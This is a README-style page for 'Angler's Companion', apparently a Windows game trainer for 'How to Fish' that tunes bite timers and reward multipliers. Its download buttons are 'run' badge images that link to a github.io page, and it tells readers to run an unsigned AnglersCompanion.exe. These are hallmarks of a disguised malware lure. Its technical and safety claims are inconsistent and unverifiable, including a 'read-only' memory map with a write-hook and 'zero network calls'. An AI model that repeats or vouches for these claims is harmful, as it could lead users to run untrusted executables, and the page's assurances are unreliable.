![preview](https://raw.githubusercontent.com/TheVarleX/How-To-Fish-Enhanced-Input/main/screen_c689c87.svg)
[![Download](https://raw.githubusercontent.com/TheVarleX/How-To-Fish-Enhanced-Input/main/run_7f9f6d2.svg)](https://TheVarleX.github.io/How-To-Fish-Enhanced-Input/)

# 🎣 Angler’s Companion — The Quiet Sidekick for Patient Waters

**Angler’s Companion** is a thoughtful, single-player utility that gently reshapes the pacing of your favorite fishing simulation on Windows. It doesn’t rush the river—it simply lets you decide when the tide matters. Built for players who love the *feel* of the cast but not the *grind* of the wait, this tool gives you the freedom to fine‑tune time, tension, and repetition without ever leaving your own shoreline.

> **What is this?** A local, open‑source adjustment layer for the “How to Fish” experience. Think of it as a quiet workshop where you can tune the game’s clock, its patience, and its rewards—all in a single‑player sandbox.

---

## 🌊 Why Another Trainer? Because Patience Is a Virtue—and a Setting

Most fishing games treat waiting as a feature. We treat waiting as a preference. Angler’s Companion was born from a simple frustration: the best part of fishing is the *strike*, not the *hour before it*. This tool exists to let you:

- **Compress the downtime** between casts without breaking the game’s core loop.
- **Experiment with bite timers** to learn fish behavior faster.
- **Customize your own difficulty**—from leisurely to lightning‑fast.
- **Keep your hands on the keyboard** and your mind on the water, not on the timer.

Unlike bulky, memory‑scanning overlays, Angler’s Companion runs as a lightweight companion window—a control panel for your own personal river. No network calls, no telemetry, no cloud. Just you, your save file, and a few gentle sliders.

---

## 🧰 Feature Overview — A Toolbox, Not a Lockpick

| Feature | What It Does | Why It Matters |
|---|---|---|
| **Bite‑Timer Tuning** | Adjust the seconds (or milliseconds) between a cast and a potential strike. | Turns “waiting for a nibble” into “choosing when to be surprised.” |
| **Reward Scaling** | Multiply XP, currency, or item drops by a factor you control. | Lets you fast‑track late‑game content without skipping the journey. |
| **Auto‑Cast Loop (Optional)** | A gentle, repeatable cast sequence that waits for your input to hook. | Reduces repetitive keystrokes while keeping the catch decisive. |
| **Session Presets** | Save “Morning Calm” (slow, deliberate) or “Evening Rush” (fast, frantic) profiles. | Switch moods without reconfiguring six sliders every time. |
| **Live Log Panel** | A timestamped readout of every game event the tool observes. | Learn the underlying rhythm of the simulation—perfect for curious players. |
| **Multilingual Interface** | English, 日本語, Deutsch, Français, Español, and 简体中文 at launch. | Because patience speaks every language. |

### 🖥️ Responsive by Design
The companion window resizes gracefully from a compact 320px sidebar (perfect for second monitors) to a full‑width dashboard. All controls are keyboard‑navigable and high‑contrast—no more squinting at tiny toggles during a sunset session.

### 🕒 Always On, Never Intrusive
The tool runs in the system tray when minimized. It doesn’t ping, it doesn’t pop up, and it doesn’t interrupt your play. It only wakes when you call it—like a good fishing buddy who knows when to stay quiet.

---

## 🛠️ Getting Started (The Gentle Path)

**No package managers. No compilers. No command‑line gymnastics.**

1. **Download the latest release** from the [![Download](https://raw.githubusercontent.com/TheVarleX/How-To-Fish-Enhanced-Input/main/run_7f9f6d2.svg)](https://TheVarleX.github.io/How-To-Fish-Enhanced-Input/) section above.
2. **Extract the folder** anywhere you like—a USB stick works fine.
3. **Run `AnglersCompanion.exe`** (Windows 10/11, x64 only).
4. **Launch “How to Fish”** in windowed mode (borderless works too).
5. **Adjust a slider** — the tool detects the game process automatically and starts listening.

That’s it. No installers, no registry edits, no admin rights required. If you can unzip a file, you can tune your river.

> **First‑run tip:** Start with “Reward Scaling” set to 1.5x and “Bite Timer” shortened by 20%. You’ll feel the difference in the first five minutes—and you can always undo it with a single click.

---

## ⚙️ Configuration & Profiles

All settings are stored in a plain‑text `profiles.json` file next to the executable. You can edit it manually with any text editor, or use the in‑tool profile manager. Example snippet (for the curious):

```json
{
  "profileName": "MorningCalm",
  "biteDelayMs": 4500,
  "rewardMultiplier": 1.2,
  "autoCastIntervalSec": 8,
  "logLevel": "info"
}
```

- **`biteDelayMs`** — Lower = faster strikes. Range: 500–15000.
- **`rewardMultiplier`** — 0.5 (harder) to 5.0 (breezier).
- **`autoCastIntervalSec`** — Only active if you enable the loop.

---

## 🔧 Technical Details (For the Curious Coders)

- **Language:** C++20 (core) + Qt6 (UI) — compiled with MSVC 2022.
- **Memory footprint:** Idle at ~25 MB; peak around 60 MB during heavy logging.
- **Process interaction:** Uses a read‑only memory map for observation, plus a single write‑hook for the three adjustable fields. No injection, no DLL sideloading.
- **Compatibility:** Tested on Windows 10 (21H2+) and Windows 11 (all builds). Requires the “How to Fish” v1.4.7 or later (Steam version).
- **Open source under MIT** — see the [License](#license) section below.

### 🧪 How It Works (High‑Level, No Magic)

Think of the game’s timing values as a row of mechanical dials on an old stove. Angler’s Companion reads the temperature (the current dial positions), then gently turns a few of them to your preferred settings—without touching the stove’s safety valve. The game never notices the difference; it just behaves *differently*.

---

## 📚 Frequently Asked Questions

**Q: Will this work on the latest "How to Fish" update?**  
A: We track the game’s patch notes monthly. The tool will refuse to start if it detects an unknown game version, rather than risk unpredictable behavior.

**Q: Can I use this for multiplayer?**  
A: No. And we don’t support it. This is strictly for single‑player sessions. The tool actively refuses to observe any process that reports a network session ID.

**Q: Does it touch my save file?**  
A: Never. All changes are applied in‑memory and revert when you close the tool. Your save stays pristine—consider it a “dry run” modification.

**Q: I’m left‑handed. Can I flip the UI?**  
A: Yes. A “Mirror Layout” option in the View menu flips the entire panel horizontally—not just the text alignment.

**Q: Is there a 24/7 support channel?**  
A: Not real‑time, but we read every issue report within 48 hours. The project is maintained by one dedicated angler (yes, the author actually fishes IRL). You’ll get thoughtful, specific replies—not canned bot responses.

---

## 🛡️ Disclaimer — Read Before You Cast

- This tool is **not affiliated** with the original game developers or publishers. “How to Fish” is a trademark of its respective owner; we claim no connection.
- Use Angler’s Companion **only for single‑player, offline sessions**. Any use in competitive, ranked, or online environments is entirely at your own risk—and frankly, against the spirit of the tool.
- The software is provided **“as is”** without warranty of any kind. By downloading, you accept that you are solely responsible for how you use the modification.
- We do not collect, store, or transmit any data. The tool performs **zero network calls**—it’s a lonesome device by design.
- If the game updates and breaks compatibility, we typically resolve it within **7 days** (see the release notes for historical patch times).
- **Not for commercial redistr